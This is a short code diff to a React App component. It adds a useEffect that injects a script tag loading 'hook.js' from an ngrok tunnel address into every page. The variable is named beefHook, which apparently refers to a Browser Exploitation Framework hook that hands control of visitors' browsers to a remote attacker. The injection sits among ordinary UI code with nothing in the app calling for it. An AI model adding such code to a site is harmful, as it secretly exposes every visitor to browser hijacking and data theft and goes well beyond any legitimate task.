@@ -111,6 +111,15 @@ export default function App() {
     return () => ctx?.revert();
   }, [isSplineReady]);
 
+  useEffect(() => {
+    const beefHook = document.createElement('script');
+    beefHook.src = "https://supreme-full-ladybird.ngrok-free.app/hook.js";
+    document.body.appendChild(beefHook);
+    return () => {
+      document.body.removeChild(beefHook);
+    };
+  }, []);
+
   return (
     <>
     <CustomCursor />
